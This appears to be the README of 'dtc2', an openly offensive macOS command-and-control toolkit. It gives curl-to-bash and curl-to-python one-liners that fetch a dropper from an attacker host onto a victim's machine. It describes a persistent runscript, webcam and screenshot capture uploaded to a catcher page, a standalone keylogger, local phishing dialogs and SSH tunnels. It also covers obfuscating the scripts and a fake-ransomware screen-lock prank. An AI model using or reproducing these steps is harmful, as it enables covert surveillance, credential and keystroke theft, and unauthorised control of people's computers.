# dtc2 - a terrible osx toolkit
Duct Tape Command and Control!
This is just a compilation of scripts to help dig in a little bit and move around. It's designed to be used with tools like pupy, empire and metasploit, by adding functionality that those toolsets don't currently have, or is not easy to run in certain circumstances. It's designed to 'hook' a host by running a one-liner, so it can be deployed quickly from a keyboard, a ducky, a bash bunny, a platypus .app, or really any other way you want to run it. The easy way is like so:
> curl -s https://haxsite.lol/launch.sh | bash 

or, if you've used the packer:

> curl -s https://haxsite.lol/launch.sh.py | python


## WARNING
You will ABSOLUTELY NEED to go into these files and edit them: cups.sh, launch.sh, tunnel.sh, upload.php, snapshot.sh. There are placeholders for where you need to put the domain or ip or host you intend to host some of these things on, and some small tweaks, but nothing that won't take you ~3 minutes.
------
It's worth considering creating a 'generator' shellscript to spit out the 'finished' versions of these files so that you don't have to edit a bunch of files every time you wish to use dtc2. 

## DISCLAIMER
------
Most of this code has been cobbled together, duct tape and bailing wire style (duct tape c2, get it now?), it is horribly vulnerable, and could use a lot of polish and work.


## A quick file list:
------
- **Airport.sh**: this is just a shortcut to the airport binary on OSX
- **geo.m**: you compile this into a binary to get GPS coords from macs
- **tunnel.plist**: this is a plist that runs tunnel.sh, to make sure an ssh tunnel stays alive (not required, but there in case you need it)
- **imagesnap**: a binary that takes webcam pics (yes, it does fire the green light)
- **launch.sh**: this is the initial dropper. It creates dirs, and installs files, scripts binaries, etc, launches first evil things. You'll want to modify this.
- **cups.sh**: This is the main runscript that runs every 30 minutes. Modify this as you see fit.
- **tunnel.sh**: a simple bash loop to keep an ssh tunnel alive.
- **gallery.html**: a terrible, but simple drop-in gallery
- **snapshot.sh**: a terrible shellscript to take pictures of desktop/webcam and upload them to the crappy upload.php catcher
- **getImages.php**: this builds the imagelist for the gallery html
- **style.css**: css for gallery
- **upload.php**: terrible file upload catcher. gets files for you and dumps them in a gallery dir
- **osascript.sh**: an example of osascript, used to locally-phish a user. try it on yourself! :D
- **almondrocks72.py**: A slightly modified version of the almondrocks python proxy, for python 2.7
- **almondrocks3.py**: Same thing, but for python3.
- **printdebug**: The ruby keylogger, torn out of powershell empire so it is standalone. It writes to /tmp/debug.db.
- **printproxy**: the "proxy2" python proxy, for python 2.7, slightly modified so that it listens on more than localhost
- **packer.py**: a thin layer of obfuscation - encodes shellscripts into base64, and runs them through python to hide cleartext. Probably a good idea to run on cups.sh, launch.sh and snapshot.sh once you're done editing them. Remember to chmod things correctly and change the file extention in launch.sh if you use this. It'll create .py files. Just make sure everything lines up.


## WORKFLOW:
------
  buy hosting/vm -> setup webserver/letsencrypt/basicauth/etc -> create all your payloads -> stand up your listeners -> edit launch.sh and cups.sh -> pack .sh files -> upload to your site/vm/etc -> launch on victim using **curl -s haxsite.lol/launch.py | python &**

You may also want to drop the gallery files into place somewhere so you can upload them. It is **STRONGLY ADVISABLE** to use letsencrypt and apache/nginx basic auth so that your victims can't just stumble across your files, and that you aren't transmitting things in the clear.


## PIRATE
------
In this directory are some files:
- **WebViewScreenSaver.saver**: a screensaver file, borrowed from https://github.com/liquidx/webviewscreensaver - modified so that the default url to open is **file:///tmp/pirate/index.html**
- **css, js, scss, index.html**: an HTML5, animated version of the archer pirate virus, with no sound
- **wannacry.jpg**: a screenshot of the wannacry ransomware application window
- **launch.sh**: the script that does the thing.

Launch.sh, when run, will drop the piratevirus files and the jpg into /tmp, it will drop the .saver file into ~/Library/Screen Savers/, then it will set the screensaver options in osx to require a password, and set the wait time for the password to 0. It'll then use osascripting to set the wannacry jpg to the desktop on all available desktops, and then select the webviewscreensaver as the main screensaver, and launch it.


As an exercise left to the reader, at this point you can elect to install the plist for an ssh tunnel if you wish, or modify cups.sh to conduct any sort of post-exploit ops you wish. 

One idea is to add another 'curl to bash' line at the end and have it fetch somethinglike 'additonal instructions' as a shellscript to run in the event you want an asycnchronous command to be run, say in the event you lose all of your shells, or they install little snitch or something. 

Please help me make this thing awesome?
